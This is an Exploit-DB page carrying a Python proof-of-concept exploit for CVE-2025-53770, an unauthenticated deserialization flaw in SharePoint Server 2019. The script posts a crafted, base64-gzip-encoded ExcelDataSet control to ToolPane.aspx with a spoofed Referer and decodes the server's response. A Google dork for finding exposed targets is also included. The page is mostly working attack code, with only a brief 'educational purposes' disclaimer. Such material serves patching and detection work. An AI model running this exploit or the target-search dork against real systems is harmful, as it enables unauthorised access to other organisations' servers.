---
title: [remote] Microsoft SharePoint Server 2019 (16.0.10383.20020) - Remote Code Execution (RCE)
url: https://www.exploit-db.com/exploits/52405
source: Exploit-DB.com RSS Feed
date: 2025-08-12
fetch_date: 2025-10-07T00:48:01.083765
---

# [remote] Microsoft SharePoint Server 2019 (16.0.10383.20020) - Remote Code Execution (RCE)

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Microsoft SharePoint Server 2019 (16.0.10383.20020) - Remote Code Execution (RCE)

#### EDB-ID:

###### 52405

#### CVE:

###### [2025-53770](https://nvd.nist.gov/vuln/detail/CVE-2025-53770)

---

**EDB Verified:**

#### Author:

###### [Agampreet Singh](/?author=12308)

#### Type:

###### [remote](/?type=remote)

---

#### Platform:

###### [Windows](/?platform=windows)

#### Date:

###### 2025-08-11

---

**Vulnerable App:**

```
# Exploit Title: Microsoft SharePoint Server 2019 – Remote Code Execution (RCE)
# Google Dork: intitle:"Microsoft SharePoint" inurl:"/_layouts/15/ToolPane.aspx"
# Date: 2025-08-07
# Exploit Author: Agampreet Singh (RedRoot Tool Maker – https://github.com/Agampreet-Singh/RedRoot)
# Vendor Homepage: https://www.microsoft.com
# Software Link: https://www.microsoft.com/en-us/microsoft-365/sharepoint/collaboration
# Version: SharePoint Server 2019 (16.0.10383.20020)
# Tested on: Windows Server 2019 (x64)
# CVE: CVE-2025-53770

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Exploit Author: Agampreet Singh (RedRoot Tool Maker)
RedRoot Repository: https://github.com/Agampreet-Singh/RedRoot
This PoC demonstrates unauthenticated RCE by exploiting unsafe deserialization in SharePoint’s ToolPane.aspx via the Scorecard:ExcelDataSet control.
FOR EDUCATIONAL AND AUTHORIZED SECURITY TESTING PURPOSES ONLY.
"""

import requests
import base64
import gzip
import re
import sys

def exploit_sharepoint(target_url):
    print(f"[+] Target: {target_url}")

    headers = {
        "Referer": "/_layouts/SignOut.aspx",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    payload = '''
<%@ Register Tagprefix="Scorecard" Namespace="Microsoft.PerformancePoint.Scorecards" Assembly="Microsoft.PerformancePoint.Scorecards.Client, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c" %>
<%@ Register Tagprefix="asp" Namespace="System.Web.UI" Assembly="System.Web.Extensions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" %>
<asp:UpdateProgress ID="UpdateProgress1" DisplayAfter="10" runat="server" AssociatedUpdatePanelID="upTest">
  <ProgressTemplate>
    <div class="divWaiting">
      <Scorecard:ExcelDataSet CompressedDataTable="H4sIAADEfmgA/4WRX2uzMBTG7/0Ukvs06ihjQb3ZbgobG1TYeO9OY6yBJpGTdHbfvudVu44x6FUkPn9+PEnK1nTdHuV8gE1P9uCCtKGFCBU7opNB9dpC4NYo9MF3kStvJen4rGKLZ4645bkU8c+c1Umalp33/0/62gGmC45pK9bA7qBZOpdI9OMrtpryM3ZR9RAee3B7HSpmXNAYdTuFTnGDVwvZKZiK9TEOUohxHFfj3crjXhRZlouPl+ftBMspIYJTVHlxEcQt13cdFTY6xHeEYdB4vaX7jet8vXERj8S/VeCcxicdtYrGuzf4OnhoSzGpftoaYykQ7FAXWbHm2T0v8qYoZP4g1+t/pbj+vyKIPxhKQUssEwvaeFpdTLOX4tfz18kZONVdDRICAAA=" DataTable-CaseSensitive="false" runat="server"></Scorecard:ExcelDataSet>
    </div>
  </ProgressTemplate>
</asp:UpdateProgress>
'''.strip()

    data = {
        "MSOTlPn_Uri": target_url,
        "MSOTlPn_DWP": payload
    }

    try:
        response = requests.post(
            f"{target_url}/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx",
            headers=headers,
            data=data,
            verify=False,
            timeout=10
        )

        if response.status_code != 200:
            print(f"[-] Unexpected HTTP response: {response.status_code}")
            return

        match = re.search(r'CompressedDataTable="([^&]+)', response.text)
        if not match:
            print("[-] No CompressedDataTable found in response.")
            return

        compressed_b64 = match.group(1)
        print("[+] Compressed payload extracted.")

        compressed_data = base64.b64decode(compressed_b64)
        decompressed_data = gzip.decompress(compressed_data)

        decoded_output = decompressed_data.decode('utf-8', errors='ignore')
        print("[+] Payload decoded successfully. Dumping to file...")

        output_file = "/tmp/sharepoint_decoded_payload.txt"
        with open(output_file, "w", encoding="utf-8") as f:
            f.write(decoded_output)

        print(f"[+] Saved to {output_file}")
        print("[*] Summary Matches:")
        for keyword in ["IntruderScannerDetectionPayload", "ExcelDataSet", "divWaiting", "ProgressTemplate", "Scorecard"]:
            if keyword in decoded_output:
                print(f"  - Found: {keyword}")

    except Exception as e:
        print(f"[!] Exploit failed: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 cve-2025-53770.py https://target.com")
        sys.exit(1)
    target = sys.argv[1].strip().rstrip('/')
    exploit_sharepoint(target)
```

**Tags:**

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| --- | --- | --- | --- |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/?utm_source=edb&utm_medium=web&utm_campaign=www) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) |

Databases

[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links

[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites

[OffSec](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com/)

Solutions

[Courses and Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Learn Subscriptions](https://www.offsec.com/learn/?utm_source=edb&utm_medium=web&utm_campaign=www)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Proving Grounds](https://www.offsec.com/labs/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/?utm_source=edb&utm_medium=web&utm_campaign=www), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) as well as high end [penetration testing](https://www.offsec.com/penetration-testing...